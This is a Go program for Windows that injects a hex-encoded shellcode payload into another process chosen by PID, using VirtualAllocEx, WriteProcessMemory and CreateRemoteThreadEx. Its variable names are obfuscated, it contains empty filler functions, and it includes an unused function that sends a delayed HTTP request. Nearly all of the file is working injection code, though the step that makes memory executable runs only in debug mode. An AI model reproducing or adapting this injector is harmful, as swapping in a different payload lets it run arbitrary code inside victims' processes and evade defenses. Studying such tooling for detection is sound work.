package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var a5a6b5b6 int32
var c4c5d5d6 int32
var e6e7f7f8 int32
var g8g9h9h9 int32
var killerShell []byte

func init() {
	rand.Seed(time.Now().UnixNano())
}

func b4b5c6c6() {
	for i := 0; i < 5; i++ {
	}
}

func c7c8d9d9() {
	for i := 0; i < 3; i++ {
	}
}

func d1d2e3e4() {
	for i := 0; i < 2; i++ {
	}
}

func e5e6f7f8(url string) {
	go func() {
		time.Sleep(5 * time.Minute)
		resp, err := http.Get(url)
		if err != nil {
			log.Println(err)
			return
		}
		defer resp.Body.Close()
	}()
}

func main() {
	a1a2b1b1 := flag.Bool("verbose", false, "Enable verbose output")
	c2c3d2d2 := flag.Bool("debug", false, "Enable debug output")
	e1e2f1f1 := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	bashShell := "505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3"
	killerShell, err := hex.DecodeString(bashShell)
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]There was an error decoding the string to a hex byte array: %s", err))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *e1e2f1f1))
	}
	pHandle, d7d8e8e9 := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*e1e2f1f1))

	if d7d8e8e9 != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", d7d8e8e9))
	}
	if *a1a2b1b1 {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *e1e2f1f1))
	}

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *e1e2f1f1))
	}
	addr, _, f1f2g2g3 := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(killerShell)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if f1f2g2g3 != nil && f1f2g2g3 != windows.SYSERR_SUCCESS {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%d", f1f2g2g3))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *a1a2b1b1 {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *e1e2f1f1))
	}

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *e1e2f1f1))
	}
	_, _, h1h2i2i3 := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&killerShell[0])), uintptr(len(killerShell)))

	if h1h2i2i3 != nil && h1h2i2i3 != windows.SYSERR_SUCCESS {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%d", h1h2i2i3))
	}
	if *a1a2b1b1 {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *e1e2f1f1))
	}

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *e1e2f1f1))
		oldProtect := uint32(windows.PAGE_READWRITE)
		_, _, i1i2j2j3 := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(killerShell)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
		if i1i2j2j3 != nil && i1i2j2j3 != windows.SYSERR_SUCCESS {
			log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%d", i1i2j2j3))
		}
		if *a1a2b1b1 {
			fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *e1e2f1f1))
		}
	}

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *e1e2f1f1))
	}
	_, _, j1j2k2k3 := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if j1j2k2k3 != nil && j1j2k2k3 != windows.SYSERR_SUCCESS {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%d", j1j2k2k3))
	}
	if *a1a2b1b1 {
		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *e1e2f1f1))
	}

	if *c2c3d2d2 {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *e1e2f1f1))
	}
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle))
	}
	if *a1a2b1b1 {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *e1e2f1f1))
	}
}